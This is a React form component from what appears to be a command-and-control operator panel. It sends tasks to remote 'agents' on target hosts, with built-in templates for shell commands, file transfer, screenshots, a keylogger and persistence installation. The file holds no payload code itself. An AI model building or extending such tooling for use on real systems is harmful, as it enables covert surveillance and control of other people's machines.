import React, { useState, useEffect } from 'react';
import {
  Box,
  TextField,
  FormControl,
  InputLabel,
  Select,
  MenuItem,
  Grid,
  Paper,
  Typography,
  Button,
  Tooltip,
  Alert,
  Chip,
  Divider,
  FormGroup,
  FormControlLabel,
  Switch,
  InputAdornment,
  LinearProgress,
} from '@mui/material';
import {
  PlayArrow as PlayIcon,
  Info as InfoIcon,
  Code as CodeIcon,
  Terminal as TerminalIcon,
  Folder as FolderIcon,
  Security as SecurityIcon,
} from '@mui/icons-material';
import { useFormik } from 'formik';
import * as yup from 'yup';
import AgentService from '../services/agentService';
import { enqueueSnackbar } from 'notistack';

const COMMAND_TEMPLATES = [
  {
    name: 'Shell Command',
    value: 'cmd',
    description: 'Execute shell command',
    template: 'whoami',
    icon: <TerminalIcon />,
  },
  {
    name: 'File Upload',
    value: 'upload',
    description: 'Upload file to target',
    template: '/path/to/local/file',
    icon: <FolderIcon />,
  },
  {
    name: 'File Download',
    value: 'download',
    description: 'Download file from target',
    template: '/path/to/remote/file',
    icon: <FolderIcon />,
  },
  {
    name: 'Screenshot',
    value: 'screenshot',
    description: 'Capture screenshot',
    template: '',
    icon: <CodeIcon />,
  },
  {
    name: 'Keylogger',
    value: 'keylogger',
    description: 'Start/stop keylogger',
    template: 'start|stop',
    icon: <SecurityIcon />,
  },
  {
    name: 'Persistence',
    value: 'persist',
    description: 'Install/uninstall persistence',
    template: 'install|uninstall',
    icon: <SecurityIcon />,
  },
  {
    name: 'System Info',
    value: 'sysinfo',
    description: 'Get system information',
    template: '',
    icon: <InfoIcon />,
  },
  {
    name: 'Process List',
    value: 'ps',
    description: 'List running processes',
    template: '',
    icon: <TerminalIcon />,
  },
  {
    name: 'Network Info',
    value: 'netstat',
    description: 'Show network connections',
    template: '',
    icon: <TerminalIcon />,
  },
];

const validationSchema = yup.object({
  agentId: yup.string().required('Agent is required'),
  command: yup.string().required('Command is required'),
  arguments: yup.string(),
  priority: yup.number().min(0).max(100).default(50),
  timeout: yup.number().min(0).max(3600).default(30),
});

const TaskCreator = ({ agentId: propAgentId, onSuccess }) => {
  const [agents, setAgents] = useState([]);
  const [selectedTemplate, setSelectedTemplate] = useState(null);
  const [customCommands, setCustomCommands] = useState([]);
  const [isLoading, setIsLoading] = useState(false);
  const [showAdvanced, setShowAdvanced] = useState(false);

  useEffect(() => {
    loadAgents();
    loadCustomCommands();
  }, []);

  const loadAgents = async () => {
    try {
      const data = await AgentService.getAgents();
      setAgents(data.filter(agent => agent.status === 'online'));
    } catch (error) {
      enqueueSnackbar(AgentService.getErrorMessage(error, 'Failed to load agents'), { variant: 'error' });
    }
  };

  const loadCustomCommands = () => {
    const saved = localStorage.getItem('ares_custom_commands');
    if (saved) {
      setCustomCommands(JSON.parse(saved));
    }
  };

  const formik = useFormik({
    initialValues: {
      agentId: propAgentId || '',
      command: '',
      arguments: '',
      priority: 50,
      timeout: 30,
      executeNow: true,
      saveAsTemplate: false,
      templateName: '',
    },
    validationSchema: validationSchema,
    onSubmit: async (values) => {
      setIsLoading(true);
      try {
        await AgentService.createTask(
          values.agentId,
          values.command,
          values.arguments
        );
        
        // Save as template if requested
        if (values.saveAsTemplate && values.templateName) {
          const newCommand = {
            name: values.templateName,
            value: values.command,
            description: 'Custom command',
            template: values.arguments,
          };
          const updated = [...customCommands, newCommand];
          setCustomCommands(updated);
          localStorage.setItem('ares_custom_commands', JSON.stringify(updated));
        }
        
        enqueueSnackbar('Task created successfully', { variant: 'success' });
        formik.resetForm();
        
        if (onSuccess) {
          onSuccess();
        }
      } catch (error) {
        enqueueSnackbar(AgentService.getErrorMessage(error, 'Failed to create task'), { variant: 'error' });
      } finally {
        setIsLoading(false);
      }
    },
  });

  const handleTemplateSelect = (template) => {
    setSelectedTemplate(template);
    formik.setValues({
      ...formik.values,
      command: template.value,
      arguments: template.template || '',
    });
  };

  const handleQuickCommand = (cmd, args = '') => {
    formik.setValues({
      ...formik.values,
      command: cmd,
      arguments: args,
    });
    
    setTimeout(() => {
      formik.handleSubmit();
    }, 100);
  };

  const QuickCommands = () => (
    <Box sx={{ mb: 3 }}>
      <Typography variant="subtitle2" gutterBottom color="textSecondary">
        Quick Commands
      </Typography>
      <Box sx={{ display: 'flex', flexWrap: 'wrap', gap: 1 }}>
        <Tooltip title="Whoami">
          <Chip
            label="whoami"
            onClick={() => handleQuickCommand('cmd', 'whoami')}
            icon={<TerminalIcon />}
            size="small"
          />
        </Tooltip>
        <Tooltip title="IP Configuration">
          <Chip
            label="ipconfig / ifconfig"
            onClick={() => handleQuickCommand('cmd', 'ipconfig /all || ifconfig')}
            icon={<TerminalIcon />}
            size="small"
          />
        </Tooltip>
        <Tooltip title="System Information">
          <Chip
            label="systeminfo"
            onClick={() => handleQuickCommand('sysinfo')}
            icon={<InfoIcon />}
            size="small"
          />
        </Tooltip>
        <Tooltip title="Process List">
          <Chip
            label="Process List"
            onClick={() => handleQuickCommand('ps')}
            icon={<TerminalIcon />}
            size="small"
          />
        </Tooltip>
        <Tooltip title="Network Connections">
          <Chip
            label="Network Info"
            onClick={() => handleQuickCommand('netstat')}
            icon={<TerminalIcon />}
            size="small"
          />
        </Tooltip>
        <Tooltip title="Take Screenshot">
          <Chip
            label="Screenshot"
            onClick={() => handleQuickCommand('screenshot')}
            icon={<CodeIcon />}
            size="small"
          />
        </Tooltip>
      </Box>
    </Box>
  );

  return (
    <Box component="form" onSubmit={formik.handleSubmit}>
      {isLoading && <LinearProgress sx={{ mb: 2 }} />}
      
      <Grid container spacing={3}>
        <Grid item xs={12} md={6}>
          <FormControl fullWidth size="small" error={formik.touched.agentId && Boolean(formik.errors.agentId)}>
            <InputLabel>Select Agent</InputLabel>
            <Select
              name="agentId"
              value={formik.values.agentId}
              onChange={formik.handleChange}
              label="Select Agent"
              disabled={!!propAgentId}
            >
              {agents.map((agent) => (
                <MenuItem key={agent.uuid} value={agent.uuid}>
                  <Box sx={{ display: 'flex', alignItems: 'center', gap: 1 }}>
                    <TerminalIcon fontSize="small" />
                    {agent.hostname} ({agent.username})
                  </Box>
                </MenuItem>
              ))}
            </Select>
            {formik.touched.agentId && formik.errors.agentId && (
              <Typography variant="caption" color="error">
                {formik.errors.agentId}
              </Typography>
            )}
          </FormControl>
        </Grid>
        
        <Grid item xs={12} md={6}>
          <FormControl fullWidth size="small">
            <InputLabel>Command Type</InputLabel>
            <Select
              value={selectedTemplate?.value || ''}
              onChange={(e) => {
                const template = [...COMMAND_TEMPLATES, ...customCommands]
                  .find(t => t.value === e.target.value);
                handleTemplateSelect(template);
              }}
              label="Command Type"
            >
              <MenuItem value="">
                <em>Custom Command</em>
              </MenuItem>
              
              <Divider>Built-in Commands</Divider>
              {COMMAND_TEMPLATES.map((template) => (
                <MenuItem key={template.value} value={template.value}>
                  <Box sx={{ display: 'flex', alignItems: 'center', gap: 1 }}>
                    {template.icon}
                    {template.name}
                  </Box>
                </MenuItem>
              ))}
              
              {customCommands.length > 0 && (
                <>
                  <Divider>Custom Commands</Divider>
                  {customCommands.map((template, index) => (
                    <MenuItem key={`custom-${index}`} value={template.value}>
                      <Box sx={{ display: 'flex', alignItems: 'center', gap: 1 }}>
                        <CodeIcon fontSize="small" />
                        {template.name}
                      </Box>
                    </MenuItem>
                  ))}
                </>
              )}
            </Select>
          </FormControl>
        </Grid>
        
        <Grid item xs={12}>
          <TextField
            fullWidth
            name="command"
            label="Command"
            value={formik.values.command}
            onChange={formik.handleChange}
            error={formik.touched.command && Boolean(formik.errors.command)}
            helperText={formik.touched.command && formik.errors.command}
            size="small"
            InputProps={{
              startAdornment: (
                <InputAdornment position="start">
                  <TerminalIcon />
                </InputAdornment>
              ),
            }}
          />
        </Grid>
        
        <Grid item xs={12}>
          <TextField
            fullWidth
            name="arguments"
            label="Arguments"
            value={formik.values.arguments}
            onChange={formik.handleChange}
            multiline
            rows={3}
            placeholder="Enter command arguments here..."
            size="small"
          />
        </Grid>
        
        <Grid item xs={12}>
          <QuickCommands />
        </Grid>
        
        <Grid item xs={12}>
          <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
            <Button
              variant="outlined"
              size="small"
              onClick={() => setShowAdvanced(!showAdvanced)}
              startIcon={<InfoIcon />}
            >
              {showAdvanced ? 'Hide Advanced' : 'Show Advanced'}
            </Button>
            
            <Box sx={{ display: 'flex', gap: 1 }}>
              <Button
                variant="outlined"
                onClick={() => formik.resetForm()}
                disabled={isLoading}
              >
                Reset
              </Button>
              <Button
                type="submit"
                variant="contained"
                startIcon={<PlayIcon />}
                disabled={isLoading || !formik.isValid}
              >
                {isLoading ? 'Creating...' : 'Execute Task'}
              </Button>
            </Box>
          </Box>
        </Grid>
        
        {showAdvanced && (
          <Grid item xs={12}>
            <Paper sx={{ p: 2, bgcolor: 'background.default' }}>
              <Typography variant="subtitle2" gutterBottom>
                Advanced Options
              </Typography>
              <Grid container spacing={2}>
                <Grid item xs={12} sm={6}>
                  <TextField
                    fullWidth
                    name="priority"
                    label="Priority (0-100)"
                    type="number"
                    value={formik.values.priority}
                    onChange={formik.handleChange}
                    size="small"
                    InputProps={{
                      inputProps: { min: 0, max: 100 },
                    }}
                  />
                </Grid>
                
                <Grid item xs={12} sm={6}>
                  <TextField
                    fullWidth
                    name="timeout"
                    label="Timeout (seconds)"
                    type="number"
                    value={formik.values.timeout}
                    onChange={formik.handleChange}
                    size="small"
                    InputProps={{
                      endAdornment: <InputAdornment position="end">sec</InputAdornment>,
                    }}
                  />
                </Grid>
                
                <Grid item xs={12}>
                  <FormGroup>
                    <FormControlLabel
                      control={
                        <Switch
                          name="executeNow"
                          checked={formik.values.executeNow}
                          onChange={formik.handleChange}
                        />
                      }
                      label="Execute immediately"
                    />
                    
                    <FormControlLabel
                      control={
                        <Switch
                          name="saveAsTemplate"
                          checked={formik.values.saveAsTemplate}
                          onChange={formik.handleChange}
                        />
                      }
                      label="Save as template"
                    />
                  </FormGroup>
                </Grid>
                
                {formik.values.saveAsTemplate && (
                  <Grid item xs={12}>
                    <TextField
                      fullWidth
                      name="templateName"
                      label="Template Name"
                      value={formik.values.templateName}
                      onChange={formik.handleChange}
                      size="small"
                      placeholder="Enter a name for this command template"
                    />
                  </Grid>
                )}
              </Grid>
            </Paper>
          </Grid>
        )}
        
        {selectedTemplate && (
          <Grid item xs={12}>
            <Alert severity="info" icon={<InfoIcon />}>
              <Typography variant="body2">
                <strong>{selectedTemplate.name}:</strong> {selectedTemplate.description}
              </Typography>
              {selectedTemplate.template && (
                <Typography variant="caption" sx={{ display: 'block', mt: 1 }}>
                  Example: <code>{selectedTemplate.template}</code>
                </Typography>
              )}
            </Alert>
          </Grid>
        )}
      </Grid>
    </Box>
  );
};

export default TaskCreator;
